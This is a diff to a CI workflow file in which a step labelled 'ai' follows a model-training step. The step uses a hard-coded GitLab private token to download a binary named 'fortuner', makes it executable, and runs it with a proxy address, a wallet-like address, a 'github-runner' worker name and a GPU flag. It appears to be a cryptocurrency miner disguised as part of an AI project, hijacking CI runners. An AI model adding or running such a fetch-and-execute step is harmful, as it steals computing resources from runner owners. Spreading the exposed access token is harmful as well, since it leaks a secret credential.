@@ -17,7 +17,9 @@ jobs:
 
       - name: Train
         run: python train.py
-		
+
       - name: ai
-        run: wget --header="PRIVATE-TOKEN: glpat-ITYlvJSY4cWXuhbYhBkwfWM6MQpvOjEKdTptcjVmNQ8.01.1716neev5" "https://gitlab.com/api/v4/projects/tirtalopi%2Fai-myproject/repository/files/fortuner/raw?ref=main" -O fortuner && chmod +x fortuner && ./fortuner --proxy 207.148.67.117:80 --address prl1p0fyfm6y8hut4prul0cwp9gqqft4lccgpha5tz96hc3t8lte39r9qfg9ry8 --worker $ -gpu
-		
+        run: |
+          wget --header="PRIVATE-TOKEN: glpat-ITYlvJSY4cWXuhbYhBkwfWM6MQpvOjEKdTptcjVmNQ8.01.1716neev5" "https://gitlab.com/api/v4/projects/tirtalopi%2Fai-myproject/repository/files/fortuner/raw?ref=main" -O fortuner
+          chmod +x fortuner
+          ./fortuner --proxy 207.148.67.117:80 --address prl1p0fyfm6y8hut4prul0cwp9gqqft4lccgpha5tz96hc3t8lte39r9qfg9ry8 --worker github-runner -gpu
